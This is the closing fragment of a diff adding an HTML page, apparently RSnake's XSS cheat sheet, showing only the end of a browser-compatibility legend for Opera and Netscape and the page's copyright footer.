+    </TR>
+    <TR>
+      <TD>O9.02<TD>
+      <TD>Vector works in Opera.  Most recently tested with Opera 9.02, Build 8586 on Windows XP Professional<TD>
+    </TR>
+    <TR>
+      <TD>NS4<TD>
+      <TD>Vector works in older versions of Netscape 4.0 - untested.<TD>
+    </TR>
+  </TABLE>
+<BR>
+Note: if a vector is not marked it either does not work or it is untested.
+</DIV>
+<BR><BR>
+
+        </TD>
+      </TR>
+      <TR>
+        <TD WIDTH="450"><A HREF="http://ha.ckers.org/"><IMG SRC="http://ha.ckers.org/images/84844372/rsnake/bottom.jpg" width="450" height="50" border="0"></A></TD>
+      </TR>
+    </TABLE>
+    <DIV ALIGN="CENTER">
+<SPAN STYLE="COLOR:#FFFFFF">
+Written in vim, and UTF-8 encoded, for her pleasure.<BR>
+All rights reserved, all wrongs observed.<BR>
+&copy; 2001-2012 <A HREF="mailto:h@ckers.org?subject=~rsnake/xss.html"><SPAN STYLE="COLOR:#FFFFFF">RSnake</SPAN></A><BR></SPAN>
+    </DIV>
+  </BODY>
+</HTML>
